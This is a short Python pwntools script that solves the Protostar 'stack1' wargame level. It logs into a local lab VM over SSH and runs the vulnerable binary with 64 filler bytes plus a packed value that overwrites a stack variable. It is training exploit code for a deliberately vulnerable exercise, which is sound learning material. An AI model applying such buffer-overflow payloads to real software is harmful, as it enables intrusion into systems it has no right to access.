from pwn import *

# The IP depends on your individual vm setup, make
# sure to change as needed.
s = ssh(host='192.168.56.102', user='user', password='user')
proc = s.run('/opt/protostar/bin/stack1 ' + '\x41'*64 + p32(0x61626364))

print proc.recv(1024)
